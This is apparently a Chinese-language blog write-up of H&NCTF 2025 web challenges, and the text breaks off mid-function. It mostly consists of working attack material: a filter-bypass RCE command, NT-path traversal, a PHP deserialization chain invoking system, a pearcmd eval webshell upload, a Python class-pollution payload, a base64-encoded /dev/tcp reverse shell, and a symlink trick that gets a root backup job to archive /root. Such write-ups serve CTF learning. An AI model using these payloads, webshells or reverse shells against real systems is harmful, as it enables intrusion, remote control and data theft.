+++
date = '2025-06-09T22:29:00+08:00'
title = 'H&NCTF-2025-Web-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++


## Web

### Really_Ez_Rce

源码

```php
<?php
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
error_reporting(0);

if (isset($_REQUEST['Number'])) {
    $inputNumber = $_REQUEST['Number'];
    
    if (preg_match('/\d/', $inputNumber)) {
        die("不行不行,不能这样");
    }

    if (intval($inputNumber)) {
        echo "OK,接下来你知道该怎么做吗";
        
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            
            if (!preg_match(
                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',
                $cmd
            )) {
                echo "你传的参数似乎挺正经的,放你过去吧<br>";
                system($cmd);
            } else {
                echo "nonono,hacker!!!";
            }
        }
    }
}
```

Payload:

```
POST: Number[]=1&cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h
```



### Watch

出题人写了一个基于 `ntdll.dll` 的 Windows NT 原生 API 调用实现的文件读取库

```go
package utils

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	STATUS_SUCCESS               = 0x00000000
	STATUS_NO_MORE_FILES         = 0x80000006
	STATUS_BUFFER_OVERFLOW       = 0x80000005
	FILE_READ_DATA               = 0x0001
	FILE_LIST_DIRECTORY          = 0x0001
	FILE_READ_ATTRIBUTES         = 0x0080
	SYNCHRONIZE                  = 0x00100000
	FILE_SHARE_READ              = 0x00000001
	FILE_SHARE_WRITE             = 0x00000002
	FILE_SHARE_DELETE            = 0x00000004
	FILE_ATTRIBUTE_DIRECTORY     = 0x00000010
	FILE_DIRECTORY_FILE          = 0x00000001
	FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
	OBJ_CASE_INSENSITIVE         = 0x00000040
	FileDirectoryInformation     = 1
	FileBasicInformation         = 4
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type IO_STATUS_BLOCK struct {
	Status      uintptr
	Information uintptr
}

type FILE_DIRECTORY_INFORMATION struct {
	NextEntryOffset uint32
	FileIndex       uint32
	CreationTime    int64
	LastAccessTime  int64
	LastWriteTime   int64
	ChangeTime      int64
	EndOfFile       int64
	AllocationSize  int64
	FileAttributes  uint32
	FileNameLength  uint32
}

type FILE_BASIC_INFORMATION struct {
	CreationTime   int64
	LastAccessTime int64
	LastWriteTime  int64
	ChangeTime     int64
	FileAttributes uint32
}

var (
	dll                      = syscall.NewLazyDLL("ntdll.dll")
	procOpenFile             = dll.NewProc("NtOpenFile")
	procClose                = dll.NewProc("NtClose")
	procQueryDirectoryFile   = dll.NewProc("NtQueryDirectoryFile")
	procReadFile             = dll.NewProc("NtReadFile")
	procQueryInformationFile = dll.NewProc("NtQueryInformationFile")
	procRtlInitUnicodeString = dll.NewProc("RtlInitUnicodeString")
)

func rtlInitUnicodeString(destinationString *UNICODE_STRING, sourceString *uint16) {
	procRtlInitUnicodeString.Call(
		uintptr(unsafe.Pointer(destinationString)),
		uintptr(unsafe.Pointer(sourceString)),
	)
}

func openFile(fileHandle *syscall.Handle, desiredAccess uint32, objectAttributes *OBJECT_ATTRIBUTES, ioStatusBlock *IO_STATUS_BLOCK, shareAccess uint32, openOptions uint32) uint32 {
	ret, _, _ := procOpenFile.Call(
		uintptr(unsafe.Pointer(fileHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(objectAttributes)),
		uintptr(unsafe.Pointer(ioStatusBlock)),
		uintptr(shareAccess),
		uintptr(openOptions),
	)
	return uint32(ret)
}

func HandleClose(handle syscall.Handle) uint32 {
	ret, _, _ := procClose.Call(uintptr(handle))
	return uint32(ret)
}

func queryDirectoryFile(fileHandle syscall.Handle, event syscall.Handle, apcRoutine uintptr, apcContext uintptr, ioStatusBlock *IO_STATUS_BLOCK, fileInformation uintptr, length uint32, fileInformationClass uint32, returnSingleEntry bool, fileName *UNICODE_STRING, restartScan bool) uint32 {
	var singleEntry uintptr = 0
	if returnSingleEntry {
		singleEntry = 1
	}
	var restart uintptr = 0
	if restartScan {
		restart = 1
	}

	ret, _, _ := procQueryDirectoryFile.Call(
		uintptr(fileHandle),
		uintptr(event),
		apcRoutine,
		apcContext,
		uintptr(unsafe.Pointer(ioStatusBlock)),
		fileInformation,
		uintptr(length),
		uintptr(fileInformationClass),
		singleEntry,
		uintptr(unsafe.Pointer(fileName)),
		restart,
	)
	return uint32(ret)
}

func readFile(fileHandle syscall.Handle, event syscall.Handle, apcRoutine uintptr, apcContext uintptr, ioStatusBlock *IO_STATUS_BLOCK, buffer uintptr, length uint32, byteOffset *int64, key uintptr) uint32 {
	ret, _, _ := procReadFile.Call(
		uintptr(fileHandle),
		uintptr(event),
		apcRoutine,
		apcContext,
		uintptr(unsafe.Pointer(ioStatusBlock)),
		buffer,
		uintptr(length),
		uintptr(unsafe.Pointer(byteOffset)),
		key,
	)
	return uint32(ret)
}

func queryInformationFile(fileHandle syscall.Handle, ioStatusBlock *IO_STATUS_BLOCK, fileInformation uintptr, length uint32, fileInformationClass uint32) uint32 {
	ret, _, _ := procQueryInformationFile.Call(
		uintptr(fileHandle),
		uintptr(unsafe.Pointer(ioStatusBlock)),
		fileInformation,
		uintptr(length),
		uintptr(fileInformationClass),
	)
	return uint32(ret)
}

func stringToUTF16Ptr(s string) *uint16 {
	utf16, err := syscall.UTF16FromString(s)
	if err != nil {
		return nil
	}
	return &utf16[0]
}

func utf16PtrToString(ptr *uint16, length uint32) string {
	if ptr == nil || length == 0 {
		return ""
	}

	slice := (*[256]uint16)(unsafe.Pointer(ptr))[:length/2]
	return syscall.UTF16ToString(slice)
}

func OpenPath(path string) (syscall.Handle, bool, error) {
	var objectNameDir UNICODE_STRING
	var handle syscall.Handle
	var iosb IO_STATUS_BLOCK
	pathDirPtr := stringToUTF16Ptr(path + `\`)
	rtlInitUnicodeString(&objectNameDir, pathDirPtr)

	objAttrDir := OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		ObjectName: &objectNameDir,
		Attributes: OBJ_CASE_INSENSITIVE,
	}

	status := openFile(
		&handle,
		FILE_LIST_DIRECTORY|FILE_READ_ATTRIBUTES|SYNCHRONIZE,
		&objAttrDir,
		&iosb,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT,
	)

	if status == STATUS_SUCCESS {
		return handle, true, nil
	}

	var objectNameFile UNICODE_STRING
	pathFilePtr := stringToUTF16Ptr(path)
	rtlInitUnicodeString(&objectNameFile, pathFilePtr)

	objAttrFile := OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		ObjectName: &objectNameFile,
		Attributes: OBJ_CASE_INSENSITIVE,
	}

	status = openFile(
		&handle,
		FILE_READ_DATA|FILE_READ_ATTRIBUTES|SYNCHRONIZE,
		&objAttrFile,
		&iosb,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		FILE_SYNCHRONOUS_IO_NONALERT,
	)

	if status == STATUS_SUCCESS {
		return handle, false, nil
	}

	return 0, false, fmt.Errorf("cant open %s", path)
}

func ListDirectory(handle syscall.Handle) (string, error) {
	const bufferSize = 65536
	buffer := make([]byte, bufferSize)

	var iosb IO_STATUS_BLOCK
	var listString string
	listString = "Directory\n==================\n"

	for {
		status := queryDirectoryFile(
			handle,
			0,
			0,
			0,
			&iosb,
			uintptr(unsafe.Pointer(&buffer[0])),
			bufferSize,
			FileDirectoryInformation,
			false,
			nil,
			false,
		)

		if status == STATUS_NO_MORE_FILES {
			break
		}

		if status != STATUS_SUCCESS && status != STATUS_BUFFER_OVERFLOW {
			return "", fmt.Errorf("query directory failed")
		}

		offset := uint32(0)
		for offset < uint32(iosb.Information) {
			dirInfo := (*FILE_DIRECTORY_INFORMATION)(unsafe.Pointer(&buffer[offset]))

			fileNamePtr := (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(dirInfo)) + unsafe.Sizeof(*dirInfo)))
			fileName := utf16PtrToString(fileNamePtr, dirInfo.FileNameLength)

			fileType := "file"
			if dirInfo.FileAttributes&FILE_ATTRIBUTE_DIRECTORY != 0 {
				fileType = "dir"
			}

			listString += fmt.Sprintf("[%s] %s (size: %d bytes)\n", fileType, fileName, dirInfo.EndOfFile)

			if dirInfo.NextEntryOffset == 0 {
				break
			}
			offset += dirInfo.NextEntryOffset
		}

		if status != STATUS_BUFFER_OVERFLOW {
			break
		}
	}
	return listString, nil
}

func ReadFile(handle syscall.Handle) (string, error) {
	var basicInfo FILE_BASIC_INFORMATION
	var iosb IO_STATUS_BLOCK

	status := queryInformationFile(
		handle,
		&iosb,
		uintptr(unsafe.Pointer(&basicInfo)),
		uint32(unsafe.Sizeof(basicInfo)),
		FileBasicInformation,
	)

	if status != STATUS_SUCCESS {
		return "", fmt.Errorf("get file information failed")
	}

	var fileString string
	fileString = "File\n==================\n"

	const maxReadSize = 1024 * 1024
	buffer := make([]byte, maxReadSize)
	var offset int64 = 0

	status = readFile(
		handle,
		0,
		0,
		0,
		&iosb,
		uintptr(unsafe.Pointer(&buffer[0])),
		maxReadSize,
		&offset,
		0,
	)

	if status == STATUS_SUCCESS {
		bytesRead := iosb.Information
		if bytesRead > 0 {
			content := string(buffer[:bytesRead])
			fileString += fmt.Sprintf("%s\n", content)
			if bytesRead == maxReadSize {
				fileString += fmt.Sprintf("\n[Tip: only part of the file is read, file size may be larger than 1MB]\n")
			}
		} else {
			fileString += fmt.Sprintf("[file is empty]")
		}
	} else {
		return "", fmt.Errorf("read file failed")
	}

	return fileString, nil
}

```

我们看handle.go

![image-20250608172059280](../assets/image-20250608172059280.png)

在这里会将我们传入的地址通过filepath.Join与`\SystemRoot\`进行拼接后传入OpenPath

![image-20250608173711892](../assets/image-20250608173711892.png)

想要使用NtOpenFile读文件我们需要使用符合格式的nt路径，而不是我们平常使用的win32路径。

如题目中的`\SystemRoot\`就是指向C:\Windows\的符号链接

可以参考：https://kiwids.me/posts/NT-Filesystem-Internals-Study-Notes/#nt-namespace-native-object-paths

所以我们如果想要读D盘的话，就有两种方法，第一种就是通过盘符去读

```
\??\D:\
```

第二种是通过卷的设备路径去读

```
\Device\HarddiskVolume3\  //HarddiskVolume2是C盘
```

回到这道题，由于会在传入的路径前面进行拼接，所以我们要在传入的path前面加入..



#### Payload

```
?path=..\??\D:\key.txt
```

或者

```
?path=..\Device\HarddiskVolume3\key.txt
```



#### 题外话

事实上第一种方法是有局限性的，我们可以看到这道题的go的版本为1.20，filepath.Join不会对\??\D:\进行过滤

而在最新的版本中会将\??\转换为\\.\??\，导致方法一失效，如图：

这是GO1.23.6版的filepath.Join

![image-20250608175939231](../assets/image-20250608175939231.png)

这是GO1.20版本的filepath.Join

![image-20250608180659681](../assets/image-20250608180659681.png)

而第二种方法则不受版本限制，在高版本中依旧适用

### ez_php

题目

```php
<?php
error_reporting(0);
class GOGOGO{
    public $dengchao;
    function __destruct(){
        echo "Go Go Go~ 出发喽！" . $this->dengchao;
    }
}
class DouBao{
    public $dao;
    public $Dagongren;
    public $Bagongren;
    function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
}
class HeiCaFei{
    public $HongCaFei;
    function __call($name, $arguments){
        call_user_func_array($this->HongCaFei, [0 => $name]);
    }
}

if (isset($_POST['data'])) {
    $temp = unserialize($_POST['data']);
    throw new Exception('What do you want to do?');
} else {
    highlight_file(__FILE__);
}
?>
```

POC

```php
<?php

class GOGOGO {
    public $dengchao;
}

class DouBao {
    public $dao;
    public $Dagongren;
    public $Bagongren;
}

class HeiCaFei {
    public $HongCaFei;
}

$exp = new GOGOGO();
$exp -> dengchao = new Doubao();
$hcf = new HeiCaFei();
$hcf->HongCaFei = "system";
$exp -> dengchao -> dao  = array($hcf,"cat /ofl1111111111ove4g");
$a=new Error("xrntkk",1);$b=new Error("xrntkk",2);
$exp -> dengchao -> Dagongren = $a;
$exp -> dengchao -> Bagongren = $b;


echo urlencode(serialize($exp));

```

得到

```
O%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D%7D
```

还需要绕过

```
throw new Exception('What do you want to do?');
```

在最后一个括号前面加上`;1`即可

最终payload

```
O%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D;1%7D
```

![image-20250608210703322](../assets/image-20250608210703322.png)



### DeceptiFlag

先对个脑洞

```http
POST /?qaq=xiyangyang HTTP/1.1
Host: 27.25.151.198:38605
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Referer: http://27.25.151.198:38605/
Cookie: PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0
Origin: http://27.25.151.198:38605
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 28

qaq_visible=xiyangyang&Lang=huitailang
```

接着看到可以文件包含，但是会在后面拼接上.php

伪协议直接读

```http
POST /tips.php?file=php://filter/resource=/var/flag/flag.txt HTTP/1.1
Host: 27.25.151.198:38605
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Referer: http://27.25.151.198:38605/
Cookie: PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0
Origin: http://27.25.151.198:38605
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 28

qaq_visible=xiyangyang&Lang=huitailang
```

![image-20250608181820237](../assets/image-20250608181820237.png)

这题也可以打pearcmd，狠狠上马

```http
POST /tips.php?+config-create+/&file=file:///usr/local/lib/php/pearcmd&/<?=eval($_POST[1])?>+1.php HTTP/1.1
Host: 27.25.151.198:49096
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=354fc88851eeee8113a2f34aa8b997d1; pahint=L3Zhci9mbGFnL2ZsYWcudHh0
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://27.25.151.198:49096/
Origin: http://27.25.151.198:49096
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Length: 28

qaq_visible=xiyangyang&Lang=huitailang
```



### [WEB+RE]Just Ping Part 1

GO的逆向

ida打开可以看到两个路由/api/ping和/api/testDevelopApi

![image-20250608182237347](../assets/image-20250608182237347.png)

跟进off_72CBA8函数后跟进moran_goweb1_handle_DevelopmentHandler

![image-20250608182412120](../assets/image-20250608182412120.png)

看不懂，直接扔给gpt分析

/api/testDevelopApi路由代码逻辑大致如下（不会逆向，大概看看

```go
func DevelopmentHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query()
    cmdStr := query.Get("cmd")
    if cmdStr == "" {
        http.Error(w, "cmd cant be null", 400)
        return
    }

    // 从对象池取命令字符串对象
    poolObj := commandStringPool.Get()

    // 用 shlex 解析命令字符串
    args, err := shlex.Split(cmdStr)
    if err != nil {
        // 解析失败时，显式回收
        commandStringPool.Put(poolObj)
        http.Error(w, "server error", 400)
        return
    }

    // 执行命令
    output, err := exec.Command(args[0], args[1:]...).CombinedOutput()
    if err != nil {
        // 执行失败时，显式回收
        commandStringPool.Put(poolObj)
        http.Error(w, "command error", 400)
        return
    }

    // 写响应
    _, err = w.Write([]byte("Command executed successfully.\n"))
    if err != nil {
        // 响应写失败时，显式回收
        commandStringPool.Put(poolObj)
        http.Error(w, "write error", 500)
        return
    }

    // 命令执行完毕且响应写完，显式回收对象池资源
    commandStringPool.Put(poolObj)
}
```

shlex.Split库会将传入的命令按照空格分割成数组，并传入exec.Command，但是没有回显

/api/ping路由实在看不懂了，就没看

直接看web端，无疑中发现

![image-20250608190600910](../assets/image-20250608190600910.png)

我测这怎么回事

经过测试可以发现，当在/api/testDevelopApi传入时

```
echo 555 555 555
```

在/api/ping中传入ip会出现如下的情况

![image-20250608190844691](../assets/image-20250608190844691.png)

大概可以理解为/api/ping和/api/testDevelopApi共用一个对象池Pool，我们在/api/testDevelopApi中执行命令后在/api/ping处发生了资源的复用

跟进/api/ping的回显，我们可以猜到这里执行的命令应该是

```
ping -c 4 127.0.0.1
```

猜测正常情况下/api/ping会从连接池中获取模板`ping -c 4 ip`并将最后一个参数替换为传入的IP，当我们在/api/testDevelopApi传入`echo 555 555 555`时，被/api/ping获取了，并拼接为`echo 555 555 127.0.0.1`执行。

所以我们可以构造出Payload:

```
/api/testDevelopApi?cmd=cat /flag 555
```

![image-20250608191954605](../assets/image-20250608191954605.png)

拿到flag



### [WEB+RE]Just Ping Part 2

这题跟上一题的web部分完全相同，但是为了方便，这题我直接弹shell了

Payload:

```
bash+-c+echo%24%7bIFS%7d%22YmFzaCAtaSA%2bJiAvZGV2L3RjcC9pcC9wb3J0IDA%2bJjE%3d%22%24%7bIFS%7d%7c%24%7bIFS%7dbase64%24%7bIFS%7d-d%24%7bIFS%7d%7c%24%7bIFS%7dbash+123
```

题目中给了个附件

```sh
#!/bin/bash

if [ ! -f "backup" ]; then
    exit 1
fi

ACTUAL_MD5=$(md5sum "backup" | cut -d' ' -f1)

if [ "$ACTUAL_MD5" = "18ed919aada0f7adca8802acf7b8a4d5" ]; then
    backup
    exit 0
else
    exit 1
fi
```

里面提到了一个backup文件

可以找到文件的路径

```
/usr/local/etc/backup
```

web目录没有读写权限，我们可以base64编码后提取backup

对backup进行逆向分析

![image-20250608220609527](../assets/image-20250608220609527.png)

Strings爆搜能找到两个路径，我们先来看backupList

![image-20250608220932554](../assets/image-20250608220932554.png)

这里有一个/root/healthy

接着看/var/backups/backup.zip，我们依旧base64后提取出来

![image-20250608221145124](../assets/image-20250608221145124.png)

![image-20250608221249266](../assets/image-20250608221249266.png)

发现这里面应该就是刚刚backupList里面/root/healthy文件夹

也就是说backup会定时把backupList中的目录备份到/var/backups/目录

我们现在目标就是要想办法利用backup将/root目录打包，这样我们就可以拿到flag

但是由于我们没有backupList的读写权限，我们需要使用一些骚操作

Payload

```shell
enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mkdir bak 
mkdir bak

enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mv backup bak/123
mv backup bak/123

enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ ln -s bak/123 backup 
ln -s bak/123 backup
//利用软连接来保证backup能被正常检验和执行

enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ echo "/root">backupList
echo "/root">backupList
//backupList需要在backup的上级目录
```

![image-20250608222525162](../assets/image-20250608222525162.png)

提取backup.zip

![image-20250608222628705](../assets/image-20250608222628705.png)

拿到flag



### 奇怪的咖啡店

题目给出了部分源码

```python
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)


def add():
    pass


@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"



def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)



app.run(host="0.0.0.0",port=5014)
```

/add路由存在原型链污染

远端应该是有waf的，但是给出的源码没给出来

```
if check(raw_data):
#检测添加的商品是否合法
```

waf比较简单，直接unicode编码绕过即可

先污染静态目录拿一手远端源码

```python
POST /add HTTP/1.1
Host: 27.25.151.198:30362
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Referer: http://27.25.151.198:30362/add
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Origin: http://27.25.151.198:30362
Accept: */*
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Content-Length: 3

{"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F":{"\u0061\u0070\u0070":{"\u0073\u0074\u0061\u0074\u0069\u0063\u005F\u0066\u006F\u006C\u0064\u0065\u0072":"\u002F"}}}
```

访问/static/app.py即可拿到完整源码

```python
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)


def add():
    pass


@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"


@app.route('/aaadminnn', methods=['GET', 'POST'])
def admin():
